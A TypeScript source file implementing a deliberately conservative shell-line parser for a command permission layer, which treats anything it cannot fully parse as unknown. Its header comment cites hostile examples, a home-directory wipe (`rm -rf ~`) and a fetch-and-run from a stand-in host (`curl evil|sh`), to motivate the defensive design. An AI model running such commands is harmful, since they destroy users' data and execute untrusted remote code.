// A deliberately small, conservative reader for shell command lines.
//
// The permission layer needs to know what a command line would actually run, not what it looks
// like as text: `ls && rm -rf ~`, `cat x | tee y`, `echo $(curl evil|sh)`. This splits a command
// line into its simple commands, words and redirections. Anything it does not fully understand
// (substitutions, subshells, heredocs, loops, ...) makes the whole parse fail, and callers must
// treat a failed parse as "unknown", never as "safe".

export interface Redirect {
  /** The operator as written, without the file descriptor: `>`, `>>`, `<`, `&>`, ... */
  op: string;
  /** File the redirect points at; null for descriptor duplication such as `2>&1`. */
  target: string | null;
  /** The target contains a variable that is only known at run time. */
  dynamic: boolean;
  /** The redirect writes (as opposed to reading). */
  write: boolean;
  /** Duplicates a descriptor (`2>&1`, `>&-`); no file is involved and `target` is null. */
  dup: boolean;
}

export interface SimpleCommand {
  /** `NAME=value` assignments written before the command, as [name, value, dynamic]. */
  env: { name: string; value: string; dynamic: boolean }[];
  /** The command and its arguments, with quotes removed. */
  words: string[];
  /** Per word: contains `$VAR`/`${…}` that is only known at run time. */
  dynamic: boolean[];
  /** Per word: contains an unquoted glob character (`*`, `?`, `[`). */
  glob: boolean[];
  redirects: Redirect[];
}

type Tok =
  | { t: "word"; text: string; dynamic: boolean; glob: boolean }
  | { t: "op"; text: string }
  | { t: "redir"; op: string; write: boolean; dup: boolean };

const RESERVED = new Set(["if", "then", "else", "elif", "fi", "for", "while", "until", "do", "done", "case", "esac", "function", "select", "{", "}", "!", "[[", "coproc"]);

/** Returns the simple commands in `cmd`, or null when the line is not simple enough to analyse. */
export function parseShell(cmd: string): SimpleCommand[] | null {
  const toks = tokenize(cmd);
  if (!toks) return null;
  const out: SimpleCommand[] = [];
  let cur: SimpleCommand = empty();
  let pendingRedirect: Extract<Tok, { t: "redir" }> | null = null;
  let seenCommandWord = false;

  const flush = () => {
    if (pendingRedirect) return false;
    if (cur.words.length || cur.redirects.length || cur.env.length) out.push(cur);
    cur = empty();
    seenCommandWord = false;
    return true;
  };

  for (const tok of toks) {
    if (tok.t === "op") {
      if (!flush()) return null;
      continue;
    }
    if (tok.t === "redir") {
      if (pendingRedirect) return null;
      pendingRedirect = tok;
      continue;
    }
    if (pendingRedirect) {
      cur.redirects.push({
        op: pendingRedirect.op,
        target: pendingRedirect.dup ? null : tok.text,
        dynamic: tok.dynamic || tok.glob,
        write: pendingRedirect.write,
        dup: pendingRedirect.dup,
      });
      pendingRedirect = null;
      continue;
    }
    if (!seenCommandWord) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/s.exec(tok.text);
      if (m && !tok.glob) {
        cur.env.push({ name: m[1], value: m[2], dynamic: tok.dynamic });
        continue;
      }
      if (RESERVED.has(tok.text)) return null;
      seenCommandWord = true;
    }
    cur.words.push(tok.text);
    cur.dynamic.push(tok.dynamic);
    cur.glob.push(tok.glob);
  }
  if (!flush()) return null;
  return out;
}

function empty(): SimpleCommand {
  return { env: [], words: [], dynamic: [], glob: [], redirects: [] };
}

const DIGITS = /[0-9]/;
const VAR_START = /[A-Za-z_0-9@*#?$!-]/;

function tokenize(src: string): Tok[] | null {
  const toks: Tok[] = [];
  let i = 0;
  const n = src.length;

  while (i < n) {
    const c = src[i];
    if (c === " " || c === "\t" || c === "\r") {
      i++;
      continue;
    }
    if (c === "\\" && src[i + 1] === "\n") {
      i += 2;
      continue;
    }
    if (c === "\n") {
      toks.push({ t: "op", text: "\n" });
      i++;
      continue;
    }
    if (c === "#") {
      while (i < n && src[i] !== "\n") i++;
      continue;
    }

    // operators
    const two = src.slice(i, i + 2);
    if (two === "&&" || two === "||" || two === "|&") {
      toks.push({ t: "op", text: two });
      i += 2;
      continue;
    }
    if (c === ";") {
      if (src[i + 1] === ";") return null; // case
      toks.push({ t: "op", text: ";" });
      i++;
      continue;
    }
    if (c === "|") {
      toks.push({ t: "op", text: "|" });
      i++;
      continue;
    }
    if (c === "&" && src[i + 1] !== ">") {
      toks.push({ t: "op", text: "&" });
      i++;
      continue;
    }

    // redirections: [fd]> >> >| &> &>> >&  [fd]< <& <<<   (heredocs << and <<- are not supported)
    let j = i;
    while (j < n && DIGITS.test(src[j])) j++;
    const redirStart = j > i && (src[j] === ">" || src[j] === "<") ? j : c === ">" || c === "<" || c === "&" ? i : -1;
    if (redirStart >= 0) {
      const rest = src.slice(redirStart);
      const m = /^(&>>|&>|>>|>\||>&|>|<<<|<<-|<<|<&|<)/.exec(rest);
      if (m) {
        const op = m[1];
        if (op === "<<" || op === "<<-") return null;
        i = redirStart + op.length;
        // `2>&1`, `>&-`: duplicating a descriptor, no file involved
        if ((op === ">&" || op === "<&") && /^(\d+|-)(?![^\s;&|])/.test(src.slice(i))) {
          const dup = /^(\d+|-)/.exec(src.slice(i))![0];
          i += dup.length;
          toks.push({ t: "redir", op, write: op === ">&", dup: true });
          toks.push({ t: "word", text: dup, dynamic: false, glob: false });
          continue;
        }
        toks.push({ t: "redir", op, write: op !== "<" && op !== "<&" && op !== "<<<", dup: false });
        continue;
      }
      if (c === "&") return null;
    }

    if (c === "(" || c === ")" || c === "`") return null;

    // a word
    let text = "";
    let dynamic = false;
    let glob = false;
    while (i < n) {
      const ch = src[i];
      if (ch === " " || ch === "\t" || ch === "\r" || ch === "\n" || ch === ";" || ch === "|" || ch === "&" || ch === "<" || ch === ">") break;
      if (ch === "(" || ch === ")" || ch === "`") return null;
      if (ch === "'") {
        const end = src.indexOf("'", i + 1);
        if (end < 0) return null;
        text += src.slice(i + 1, end);
        i = end + 1;
        continue;
      }
      if (ch === '"') {
        i++;
        let closed = false;
        while (i < n) {
          const d = src[i];
          if (d === '"') {
            closed = true;
            i++;
            break;
          }
          if (d === "\\" && i + 1 < n) {
            const e = src[i + 1];
            text += e === "$" || e === "`" || e === '"' || e === "\\" ? e : "\\" + e;
            i += 2;
            continue;
          }
          if (d === "`") return null;
          if (d === "$") {
            const e = src[i + 1];
            if (e === "(") return null;
            if (e === "{" || (e !== undefined && VAR_START.test(e))) dynamic = true;
          }
          text += d;
          i++;
        }
        if (!closed) return null;
        continue;
      }
      if (ch === "\\") {
        if (i + 1 >= n) return null;
        if (src[i + 1] === "\n") {
          i += 2;
          continue;
        }
        text += src[i + 1];
        i += 2;
        continue;
      }
      if (ch === "$") {
        const e = src[i + 1];
        if (e === "(" || e === "'" || e === '"') return null; // command substitution, arithmetic, ANSI-C quoting
        if (e === "{" || (e !== undefined && VAR_START.test(e))) dynamic = true;
      }
      if (ch === "*" || ch === "?" || ch === "[") glob = true;
      text += ch;
      i++;
    }
    // `<(` / `>(` process substitution are caught above (the word loop stops at < and >, then the
    // redirection branch sees `(` next and bails).
    toks.push({ t: "word", text, dynamic, glob });
  }
  return toks;
}
